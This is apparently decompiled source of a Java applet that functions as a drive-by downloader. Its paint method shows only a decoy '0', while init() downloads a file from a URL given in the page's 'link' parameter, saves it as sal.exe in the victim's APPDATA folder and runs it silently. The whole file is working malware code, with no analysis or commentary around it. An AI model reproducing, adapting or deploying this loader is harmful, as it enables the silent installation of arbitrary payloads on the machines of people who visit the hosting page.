import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.IOException;
import java.awt.Graphics;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    @Override
    public void paint(final Graphics graphics) {
        graphics.drawString("0", 20, 20);
    }
    
    @Override
    public void init() {
        final String concat = System.getenv("APPDATA").concat("\\sal.exe");
        System.out.println(concat);
        this.download(this.getParameter("link"), concat);
        final Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(concat);
        }
        catch (IOException ex) {
            System.out.println(ex);
        }
    }
    
    public void download(final String s, final String s2) {
        OutputStream outputStream = null;
        InputStream inputStream = null;
        try {
            final URL url = new URL(s);
            outputStream = new BufferedOutputStream(new FileOutputStream(s2));
            inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array)) != -1) {
                outputStream.write(array, 0, read);
            }
        }
        catch (Exception ex) {
            System.out.println(ex);
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (outputStream != null) {
                    outputStream.close();
                }
            }
            catch (IOException ex2) {
                System.out.println(ex2);
            }
        }
        finally {
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (outputStream != null) {
                    outputStream.close();
                }
            }
            catch (IOException ex3) {
                System.out.println(ex3);
            }
        }
    }
}
